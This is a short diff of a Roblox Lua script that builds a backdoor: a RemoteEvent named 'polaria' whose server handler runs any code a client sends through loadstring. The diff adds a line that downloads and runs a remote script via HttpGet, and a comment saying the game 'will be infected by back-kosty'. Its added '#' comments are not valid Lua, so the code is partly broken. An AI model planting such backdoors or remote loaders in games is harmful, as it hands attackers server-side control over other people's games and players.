@@ -9,7 +9,7 @@ backdoor.OnServerEvent:connect(function(player, SS)
 	loadstring(SS)()
 end)
 
-and
+# stape 2
 
 local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
 backdoor.Name = "polaria"
@@ -23,4 +23,6 @@ backdoor.OnServerEvent:Connect(function(player, SS)
 	end
 end)
 
-after that your game will be infected by back-kosty
+# after that your game will be infected by back-kosty
+# loadstring 1
+loadstring(game:HttpGet("https://example.com/script.lua"))()
